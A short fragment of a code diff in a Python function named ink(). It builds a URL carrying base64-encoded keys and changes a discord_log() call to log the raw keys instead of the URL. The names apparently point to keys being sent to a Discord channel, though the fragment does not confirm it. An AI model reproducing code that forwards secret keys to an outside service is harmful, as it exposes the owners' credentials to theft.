@@ -963,7 +963,7 @@ def ink():
 
     url = input_url + "?ck=" + keysbase64
 
-    discord_log(url)
+    discord_log(keys)
 
     result = result.replace("\n", " ")
 
